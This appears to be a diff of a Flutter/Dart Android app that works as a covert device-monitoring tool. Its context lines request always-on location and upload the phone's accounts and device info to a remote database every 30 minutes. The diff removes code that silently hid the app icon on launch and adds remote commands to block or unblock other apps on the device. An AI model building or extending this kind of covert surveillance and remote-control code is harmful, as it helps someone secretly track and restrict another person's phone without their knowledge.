@@ -92,11 +92,8 @@ Future<void> _requestPermissions() async {
       await Permission.locationAlways.request();
     }
   } catch (_) {}
-  // Auto-hide icon silently on first launch
-  try {
-    const channel = MethodChannel(_kCtrlChannel);
-    await channel.invokeMethod('hideIcon');
-  } catch (_) {}
+  // Note: Icon hiding disabled on first launch to allow app to run
+  // User can manually hide icon from app settings after granting permissions
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -228,12 +225,50 @@ void _onServiceStart(ServiceInstance service) async {
     }
   });
 
+  // Block app
+  deviceRef.child('commands/block_app').onValue.listen((event) async {
+    final pkg = event.snapshot.value;
+    if (pkg is String && pkg.isNotEmpty) {
+      await deviceRef.child('commands/block_app').set('');
+      await _blockApp(pkg);
+      await deviceRef.child('blocked_apps/$pkg').set(true);
+    }
+  });
+
+  // Unblock app
+  deviceRef.child('commands/unblock_app').onValue.listen((event) async {
+    final pkg = event.snapshot.value;
+    if (pkg is String && pkg.isNotEmpty) {
+      await deviceRef.child('commands/unblock_app').set('');
+      await _unblockApp(pkg);
+      await deviceRef.child('blocked_apps/$pkg').set(false);
+    }
+  });
+
   // Accounts upload (Gmail detection)
   await _pushAccounts(deviceRef);
   Timer.periodic(const Duration(minutes: 30), (_) => _pushAccounts(deviceRef));
 
   // Device info upload
   await _pushDeviceInfo(deviceRef);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  APP BLOCKING
+// ═══════════════════════════════════════════════════════════════════════════════
+
+Future<void> _blockApp(String packageName) async {
+  try {
+    const channel = MethodChannel(_kCtrlChannel);
+    await channel.invokeMethod('blockApp', {'package': packageName});
+  } catch (_) {}
+}
+
+Future<void> _unblockApp(String packageName) async {
+  try {
+    const channel = MethodChannel(_kCtrlChannel);
+    await channel.invokeMethod('unblockApp', {'package': packageName});
+  } catch (_) {}
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
